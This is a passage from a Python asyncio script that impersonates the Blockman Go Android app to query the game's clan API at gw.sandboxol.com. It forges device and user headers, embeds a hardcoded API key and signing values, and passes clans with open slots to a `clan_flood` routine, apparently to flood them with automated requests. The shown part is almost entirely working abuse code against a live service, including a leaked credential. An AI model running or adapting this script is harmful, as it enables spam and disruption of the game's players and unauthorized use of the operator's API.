                "tr_TR", "uk_UA", "vi_VN"
            ]
        )
        try:
            async with session.get(
                f"https://{random.choice(DATA_CENTERS)}/clan/api/v1/clan/tribe/recommendation",
                timeout=2,
                headers={
                    "language": region, "userId": user_id, "packageName": "official",
                    "packageNameFull": "com.sandboxol.blockymods", "androidVersion": "30",
                    "OS": "android", "appType": "android", "appLanguage": region[:2],
                    "appVersion": "5421", "appVersionName": "2.125.1", "channel": "sandbox",
                    "uid_register_ts": register_time, "device_register_ts": device_register_time,
                    "eventType": "app", "userDeviceId": android_id, "userLanguage": region,
                    "region": "RU", "clientType": "client", "env": "prd",
                    "package_name_en": "com.sandboxol.blockymods",
                    "md5": "c0c2f5baf2e9b4a063fc0cdf099960de", "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
                    "X-Nonce": nonce, "X-Time": xtime, "X-Sign": xsign,
                    "X-UrlPath": "/clan/api/v1/clan/tribe/recommendation",
                    "Access-Token": get_enc_token(token + nonce), "Host": "gw.sandboxol.com",
                    "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "User-Agent": "okhttp/4.10.0"
                }
            ) as response:
                data = await response.json()
                clan_ids = [
                    clan["clanId"]
                    for clan in data["data"]
                    if clan["currentCount"] < clan["maxCount"]
                ]
                if not clan_ids:
                    continue
                await clan_flood(session, random.choice(clan_ids), region)
        except Exception as e:
            print(e)

asyncio.run(main())